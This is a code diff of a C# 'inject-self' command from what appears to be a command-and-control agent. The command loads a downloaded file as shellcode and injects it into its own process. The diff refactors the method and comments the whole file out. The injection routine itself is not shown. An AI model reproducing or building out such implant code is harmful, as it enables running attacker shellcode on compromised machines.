@@ -1,5 +1,4 @@
-﻿using Agent.Internal;
-using Agent.Models;
+﻿/*using Agent.Models;
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -14,28 +13,25 @@ namespace Agent.Commands
     {
         public override string Name => "inject-self";
 
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
+        public override void InnerExecute(AgentTask task, AgentCommandContext context)
         {
-            var fileName = task.FileId;
-            var fileContent = commm.Download(task.FileId, a =>
-            {
-                result.Info = $"Downloading {fileName} ({a}%)";
-                commm.SendResult(result);
-            }).Result;
 
-            this.Notify(result, commm, $"{fileName} Downloaded");
+            this.CheckFileDownloaded(task, context);
+
+            var file = context.FileService.ConsumeDownloadedFile(task.FileId);
+            var fileContent = file.GetFileContent();
 
             var shellcode = fileContent;
 
-            var injectRes =  Injector.InjectSelfWithOutput(fileContent);
-            if(!injectRes.Succeed)
-                result.Result += $"Injection failed : {injectRes.Error}";
+            var injectRes = Injector.InjectSelfWithOutput(fileContent);
+            if (!injectRes.Succeed)
+                context.Result.Result += $"Injection failed : {injectRes.Error}";
             else
             {
-                result.Result += $"Injection succeed!" + Environment.NewLine;
+                context.Result.Result += $"Injection succeed!" + Environment.NewLine;
                 if (!string.IsNullOrEmpty(injectRes.Output))
-                    result.Result += injectRes.Output;
+                    context.Result.Result += injectRes.Output;
             }
         }
     }
-}
+}*/
